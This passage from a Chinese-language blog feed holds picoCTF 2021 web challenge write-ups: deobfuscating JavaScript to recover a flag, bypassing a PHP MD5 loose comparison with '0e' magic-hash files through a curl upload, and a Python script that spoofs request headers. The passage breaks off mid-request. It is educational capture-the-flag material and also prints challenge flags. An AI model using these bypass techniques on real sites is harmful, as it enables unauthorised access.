string">'0x2'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>split<span class="token operator">*</span><span class="token number">0x2</span><span class="token punctuation">,</span>split<span class="token operator">*</span><span class="token number">0x2</span><span class="token operator">*</span><span class="token number">0x2</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">'0x4'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>checkpass<span class="token punctuation">[</span><span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">'0x2'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0x3</span><span class="token punctuation">,</span><span class="token number">0x6</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">'oCT'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>checkpass<span class="token punctuation">[</span><span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">'0x2'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>split<span class="token operator">*</span><span class="token number">0x3</span><span class="token operator">*</span><span class="token number">0x2</span><span class="token punctuation">,</span>split<span class="token operator">*</span><span class="token number">0x4</span><span class="token operator">*</span><span class="token number">0x2</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">'0x5'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>checkpass<span class="token punctuation">[</span><span class="token string">'substring'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0x6</span><span class="token punctuation">,</span><span class="token number">0xb</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">'F&#123;not'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>checkpass<span class="token punctuation">[</span><span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">'0x2'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>split<span class="token operator">*</span><span class="token number">0x2</span><span class="token operator">*</span><span class="token number">0x2</span><span class="token punctuation">,</span>split<span class="token operator">*</span><span class="token number">0x3</span><span class="token operator">*</span><span class="token number">0x2</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">'0x6'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>checkpass<span class="token punctuation">[</span><span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">'0x2'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0xc</span><span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">'0x7'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">'0x8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">'0x9'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>找个在线网站进行美化</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> _0x5a46 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'f49bf&#125;'</span><span class="token punctuation">,</span> <span class="token string">'_again_e'</span><span class="token punctuation">,</span> <span class="token string">'this'</span><span class="token punctuation">,</span> <span class="token string">'Password\x20Verified'</span><span class="token punctuation">,</span> <span class="token string">'Incorrect\x20password'</span><span class="token punctuation">,</span> <span class="token string">'getElementById'</span><span class="token punctuation">,</span> <span class="token string">'value'</span><span class="token punctuation">,</span> <span class="token string">'substring'</span><span class="token punctuation">,</span> <span class="token string">'picoCTF&#123;'</span><span class="token punctuation">,</span> <span class="token string">'not_this'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">_0x4bd822<span class="token punctuation">,</span> _0x2bd6f7</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">var</span> <span class="token function-variable function">_0xb4bdb3</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">_0x1d68f6</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">--</span>_0x1d68f6<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>_0x4bd822<span class="token punctuation">[</span><span class="token string">'push'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x4bd822<span class="token punctuation">[</span><span class="token string">'shift'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token function">_0xb4bdb3</span><span class="token punctuation">(</span><span class="token operator">++</span>_0x2bd6f7<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">(</span>_0x5a46<span class="token punctuation">,</span> <span class="token number">0x1b3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> <span class="token function-variable function">_0x4b5b</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">_0x2d8f05<span class="token punctuation">,</span> _0x4b81bb</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>_0x2d8f05 <span class="token operator">=</span> _0x2d8f05 <span class="token operator">-</span> <span class="token number">0x0</span><span class="token punctuation">;</span><span class="token keyword">var</span> _0x4d74cb <span class="token operator">=</span> _0x5a46<span class="token punctuation">[</span>_0x2d8f05<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">return</span> _0x4d74cb<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">verify</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>checkpass <span class="token operator">=</span> document<span class="token punctuation">[</span><span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">'0x0'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'pass'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">'0x1'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>split <span class="token operator">=</span> <span class="token number">0x4</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>checkpass<span class="token punctuation">[</span><span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">'0x2'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span> split <span class="token operator">*</span> <span class="token number">0x2</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">'0x3'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>checkpass<span class="token punctuation">[</span><span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">'0x2'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0x7</span><span class="token punctuation">,</span> <span class="token number">0x9</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'&#123;n'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>checkpass<span class="token punctuation">[</span><span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">'0x2'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>split <span class="token operator">*</span> <span class="token number">0x2</span><span class="token punctuation">,</span> split <span class="token operator">*</span> <span class="token number">0x2</span> <span class="token operator">*</span> <span class="token number">0x2</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">'0x4'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>checkpass<span class="token punctuation">[</span><span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">'0x2'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0x3</span><span class="token punctuation">,</span> <span class="token number">0x6</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'oCT'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>checkpass<span class="token punctuation">[</span><span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">'0x2'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>split <span class="token operator">*</span> <span class="token number">0x3</span> <span class="token operator">*</span> <span class="token number">0x2</span><span class="token punctuation">,</span> split <span class="token operator">*</span> <span class="token number">0x4</span> <span class="token operator">*</span> <span class="token number">0x2</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">'0x5'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>checkpass<span class="token punctuation">[</span><span class="token string">'substring'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0x6</span><span class="token punctuation">,</span> <span class="token number">0xb</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'F&#123;not'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>checkpass<span class="token punctuation">[</span><span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">'0x2'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>split <span class="token operator">*</span> <span class="token number">0x2</span> <span class="token operator">*</span> <span class="token number">0x2</span><span class="token punctuation">,</span> split <span class="token operator">*</span> <span class="token number">0x3</span> <span class="token operator">*</span> <span class="token number">0x2</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">'0x6'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>checkpass<span class="token punctuation">[</span><span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">'0x2'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0xc</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">'0x7'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">'0x8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token function">_0x4b5b</span><span class="token punctuation">(</span><span class="token string">'0x9'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/image-20210810143600817.png" alt="image-20210810143600817" loading="lazy"></p><p>在浏览器的控制台中直接运行JS代码，可以看到回显内容。由此，<code>function verify()</code>再次进行美化</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">verify</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>checkpass <span class="token operator">=</span> document<span class="token punctuation">[</span><span class="token function">getElemntById</span><span class="token punctuation">(</span><span class="token string">'pass'</span><span class="token punctuation">)</span>value<span class="token punctuation">]</span><span class="token punctuation">;</span>split <span class="token operator">=</span> <span class="token number">0x4</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>checkpass <span class="token punctuation">[</span><span class="token string">'substring'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">,</span> split <span class="token operator">*</span> <span class="token number">0x2</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'picoCTF&#123;'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>checkpass<span class="token punctuation">[</span><span class="token string">'substring'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0x7</span><span class="token punctuation">,</span> <span class="token number">0x9</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'&#123;n'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>checkpass<span class="token punctuation">[</span><span class="token string">'substring'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>split <span class="token operator">*</span> <span class="token number">0x2</span><span class="token punctuation">,</span> split <span class="token operator">*</span> <span class="token number">0x2</span> <span class="token operator">*</span> <span class="token number">0x2</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'not_this'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>checkpass<span class="token punctuation">[</span><span class="token string">'substring'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0x3</span><span class="token punctuation">,</span> <span class="token number">0x6</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'oCT'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>checkpass<span class="token punctuation">[</span><span class="token string">'substring'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>split <span class="token operator">*</span> <span class="token number">0x3</span> <span class="token operator">*</span> <span class="token number">0x2</span><span class="token punctuation">,</span> split <span class="token operator">*</span> <span class="token number">0x4</span> <span class="token operator">*</span> <span class="token number">0x2</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'f49bf&#125;'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>checkpass<span class="token punctuation">[</span><span class="token string">'substring'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0x6</span><span class="token punctuation">,</span> <span class="token number">0xb</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'F&#123;not'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>checkpass<span class="token punctuation">[</span><span class="token string">'substring'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>split <span class="token operator">*</span> <span class="token number">0x2</span> <span class="token operator">*</span> <span class="token number">0x2</span><span class="token punctuation">,</span> split <span class="token operator">*</span> <span class="token number">0x3</span> <span class="token operator">*</span> <span class="token number">0x2</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'_again_e'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>checkpass<span class="token punctuation">[</span><span class="token string">'substring'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0xc</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'this'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'Password Verified'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'Incorrect password'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>得到信息</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span>      <span class="token operator">==</span> <span class="token string">"picoCTF&#123;"</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token operator">-</span><span class="token number">9</span><span class="token punctuation">)</span>      <span class="token operator">==</span> <span class="token string">"&#123;n"</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token operator">-</span><span class="token number">16</span><span class="token punctuation">)</span>     <span class="token operator">==</span> <span class="token string">"not_this"</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">)</span>      <span class="token operator">==</span> <span class="token string">"oCT"</span><span class="token punctuation">(</span><span class="token number">24</span><span class="token operator">-</span><span class="token number">32</span><span class="token punctuation">)</span>    <span class="token operator">==</span> <span class="token string">"f49bf&#125;"</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token operator">-</span><span class="token number">11</span><span class="token punctuation">)</span>     <span class="token operator">==</span> <span class="token string">"F&#123;not"</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token operator">-</span><span class="token number">24</span><span class="token punctuation">)</span>    <span class="token operator">==</span> <span class="token string">"_again_e"</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token operator">-</span><span class="token number">16</span><span class="token punctuation">)</span>    <span class="token operator">==</span> <span class="token string">"this"</span>#picoCTF<span class="token punctuation">&#123;</span>not_this_again_ef49bf<span class="token punctuation">&#125;</span></code></pre><p>拼也拼出来了。</p>]]></content>
      
      
      <categories>
          
          <category> CTF题记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF题记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PicoCTF2021_Web(二)</title>
      <link href="/posts/3246d33f/"/>
      <url>/posts/3246d33f/</url>
      
        <content type="html"><![CDATA[<p><img src="https://gitee.com/m0re/picture/raw/master/img/v2-e4c3f97559a3d4655aa5ffe2eaf52d72_r.jpg" loading="lazy"></p><p>比起晴空万里，我更需要你</p><a id="more"></a><h1 id="It-is-my-Birthday"><a href="#It-is-my-Birthday" class="headerlink" title="It is my Birthday"></a>It is my Birthday</h1><blockquote><p>描述：I sent out 2 invitations to all of my friends for my birthday! I’ll know if they get stolen because the two invites look similar, and they even have the same md5 hash, but they are slightly different! You wouldn’t believe how long it took me to find a collision. Anyway, see if you’re invited by submitting 2 PDFs to my website.</p><p>Hints:</p><pre><code>    1. Look at the category of this problem.      2. How may a PHP site check the rules in the description?</code></pre></blockquote><p>网站打开也是可以看到<br><img src="https://gitee.com/m0re/picture/raw/master/img/image-20210808190627805.png" alt="image-20210808190627805" loading="lazy"></p><p>上传功能，而且根据题目描述，需要上传的是两个PDF文件，且他们的md5哈希值要相同。这个一开始看很懵，怎么控制文件的md5值相同。</p><blockquote><p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p></blockquote><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀m0re<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/桌面/CTF<span class="token punctuation">]</span>└─<span class="token comment"># echo -n "s878926199a" > ctf1.pdf</span>                                                                                                                                      ┌──<span class="token punctuation">(</span>root💀m0re<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/桌面/CTF<span class="token punctuation">]</span>└─<span class="token comment"># echo -n "s1665632922a" > ctf2.pdf</span>                                                                                                                                      ┌──<span class="token punctuation">(</span>root💀m0re<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/桌面/CTF<span class="token punctuation">]</span>└─<span class="token comment"># md5sum ctf1.pdf ctf2.pdf </span>0e545993274517709034328855841020  ctf1.pdf0e731198061491163073197128363787  ctf2.pdf</code></pre><p>所以上传这两个文件即可，保证他们的md5值均为0，即可绕过PHP中的弱类型的md5绕过。符合第二个hint<br>拿到了源码</p><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?phpif (isset($_POST[&quot;submit&quot;])) &#123;    $type1 &#x3D; $_FILES[&quot;file1&quot;][&quot;type&quot;];    $type2 &#x3D; $_FILES[&quot;file2&quot;][&quot;type&quot;];    $size1 &#x3D; $_FILES[&quot;file1&quot;][&quot;size&quot;];    $size2 &#x3D; $_FILES[&quot;file2&quot;][&quot;size&quot;];    $SIZE_LIMIT &#x3D; 18 * 1024;    if (($size1 &lt; $SIZE_LIMIT) &amp;&amp; ($size2 &lt; $SIZE_LIMIT)) &#123;        if (($type1 &#x3D;&#x3D; &quot;application&#x2F;pdf&quot;) &amp;&amp; ($type2 &#x3D;&#x3D; &quot;application&#x2F;pdf&quot;)) &#123;            $contents1 &#x3D; file_get_contents($_FILES[&quot;file1&quot;][&quot;tmp_name&quot;]);            $contents2 &#x3D; file_get_contents($_FILES[&quot;file2&quot;][&quot;tmp_name&quot;]);            if ($contents1 !&#x3D; $contents2) &#123;                if (md5_file($_FILES[&quot;file1&quot;][&quot;tmp_name&quot;]) &#x3D;&#x3D; md5_file($_FILES[&quot;file2&quot;][&quot;tmp_name&quot;])) &#123;                    highlight_file(&quot;index.php&quot;);                    die();                &#125; else &#123;                    echo &quot;MD5 hashes do not match!&quot;;                    die();                &#125;            &#125; else &#123;                echo &quot;Files are not different!&quot;;                die();            &#125;        &#125; else &#123;            echo &quot;Not a PDF!&quot;;            die();        &#125;    &#125; else &#123;        echo &quot;File too large!&quot;;        die();    &#125;&#125;&#x2F;&#x2F; FLAG: picoCTF&#123;c0ngr4ts_u_r_1nv1t3d_aad886b9&#125;?&gt;&lt;!DOCTYPE html&gt;&lt;html lang&#x3D;&quot;en&quot;&gt;&lt;head&gt;    &lt;title&gt;It is my Birthday&lt;&#x2F;title&gt;    &lt;link href&#x3D;&quot;https:&#x2F;&#x2F;maxcdn.bootstrapcdn.com&#x2F;bootstrap&#x2F;3.2.0&#x2F;css&#x2F;bootstrap.min.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;    &lt;link href&#x3D;&quot;https:&#x2F;&#x2F;getbootstrap.com&#x2F;docs&#x2F;3.3&#x2F;examples&#x2F;jumbotron-narrow&#x2F;jumbotron-narrow.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;    &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;ajax.googleapis.com&#x2F;ajax&#x2F;libs&#x2F;jquery&#x2F;3.3.1&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;    &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;maxcdn.bootstrapcdn.com&#x2F;bootstrap&#x2F;3.3.7&#x2F;js&#x2F;bootstrap.min.js&quot;&gt;&lt;&#x2F;script&gt;&lt;&#x2F;head&gt;&lt;body&gt;    &lt;div class&#x3D;&quot;container&quot;&gt;        &lt;div class&#x3D;&quot;header&quot;&gt;            &lt;h3 class&#x3D;&quot;text-muted&quot;&gt;It is my Birthday&lt;&#x2F;h3&gt;        &lt;&#x2F;div&gt;        &lt;div class&#x3D;&quot;jumbotron&quot;&gt;            &lt;p class&#x3D;&quot;lead&quot;&gt;&lt;&#x2F;p&gt;            &lt;div class&#x3D;&quot;row&quot;&gt;                &lt;div class&#x3D;&quot;col-xs-12 col-sm-12 col-md-12&quot;&gt;                    &lt;h3&gt;See if you are invited to my party!&lt;&#x2F;h3&gt;                &lt;&#x2F;div&gt;            &lt;&#x2F;div&gt;            &lt;br&#x2F;&gt;            &lt;div class&#x3D;&quot;upload-form&quot;&gt;                &lt;form role&#x3D;&quot;form&quot; action&#x3D;&quot;&#x2F;index.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;                &lt;div class&#x3D;&quot;row&quot;&gt;                    &lt;div class&#x3D;&quot;form-group&quot;&gt;                        &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file1&quot; id&#x3D;&quot;file1&quot; class&#x3D;&quot;form-control input-lg&quot;&gt;                        &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file2&quot; id&#x3D;&quot;file2&quot; class&#x3D;&quot;form-control input-lg&quot;&gt;                    &lt;&#x2F;div&gt;                &lt;&#x2F;div&gt;                &lt;div class&#x3D;&quot;row&quot;&gt;                    &lt;div class&#x3D;&quot;col-xs-12 col-sm-12 col-md-12&quot;&gt;                        &lt;input type&#x3D;&quot;submit&quot; class&#x3D;&quot;btn btn-lg btn-success btn-block&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;Upload&quot;&gt;                    &lt;&#x2F;div&gt;                &lt;&#x2F;div&gt;                &lt;&#x2F;form&gt;            &lt;&#x2F;div&gt;        &lt;&#x2F;div&gt;    &lt;&#x2F;div&gt;    &lt;footer class&#x3D;&quot;footer&quot;&gt;        &lt;p&gt;&amp;copy; PicoCTF&lt;&#x2F;p&gt;    &lt;&#x2F;footer&gt;&lt;&#x2F;div&gt;&lt;script&gt;$(document).ready(function()&#123;    $(&quot;.close&quot;).click(function()&#123;        $(&quot;myAlert&quot;).alert(&quot;close&quot;);    &#125;);&#125;);&lt;&#x2F;script&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</code></pre><p>大佬的做法是</p><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀m0re<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/桌面/CTF<span class="token punctuation">]</span>└─<span class="token comment"># curl -F 'file1=@ctf1.pdf' -F 'file2=@ctf2.pdf' -F 'submit=Upload' http://mercury.picoctf.net:55343/ -s | egrep -o "picoCTF&#123;[^&#125;]+&#125;"</span>picoCTF<span class="token punctuation">&#123;</span>c0ngr4ts_u_r_1nv1t3d_aad886b9<span class="token punctuation">&#125;</span></code></pre><h1 id="Who-are-you"><a href="#Who-are-you" class="headerlink" title="Who are you?"></a>Who are you?</h1><p>假猪套，不细说。<br>脚本：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://mercury.picoctf.net:46199/"</span>headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">"Host"</span><span class="token punctuation">:</span> <span class="token string">"mercury.picoctf.net:46199"</span><span class="token punctuation">,</span>    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"PicoBrowser"</span><span class="token punctuation">,</span>    <span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"sv-sv"</span><span class="token punctuation">,</span>    <span class="token string">"X-Forwarded-For"</span><span class="token punctuation">:</span> <span class="token string">"31.15.32.0"</span><span class="token punctuation">,</span>    <span class="token string">"DNT"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span>    <span class="token string">"Referer"</span><span class="token punctuation">:</span> <span class="token string">"http://mercury.picoctf.net:46199"</span><span class="token punctuation">,</span>    <span class="token string">"Date"</span><span class="token punctuation">:</span> <span class="token string">"2018"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span>r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token comment"># print(r.text)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;b>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;/b>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>POC： </p><pre class="language-http" data-language="http"><code class="language-http">GET / HTTP/1.1<span class="token header-name keyword">Host:</span> mercury.picoctf.net:46199<span class="token header-name 